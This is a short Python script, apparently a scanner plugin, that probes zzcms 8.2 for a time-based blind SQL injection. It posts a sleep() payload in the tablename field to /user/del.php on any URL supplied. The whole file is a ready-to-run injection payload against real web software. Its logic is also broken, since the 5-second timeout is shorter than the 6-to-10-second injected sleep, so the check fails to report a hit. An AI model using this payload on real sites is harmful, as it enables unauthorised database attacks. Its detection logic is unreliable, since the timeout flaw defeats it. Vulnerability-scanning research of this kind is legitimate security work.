#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
import time
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "zzcms 8.2 sql注入",
        "desc": "zzcms 8.2 sql注入漏洞",
        "grade": "高",
        "type": "web",
        "keyword": "tag:zzcms8.2",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    rand_time = random.randint(6, 10)
    try:
        startTime = time.time()
        r = requests.post(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/user/del.php', 
            data=f"id=1&tablename=zzcms_answer where id = 1 and sleep({rand_time})%23",
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and time.time() - startTime > rand_time:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

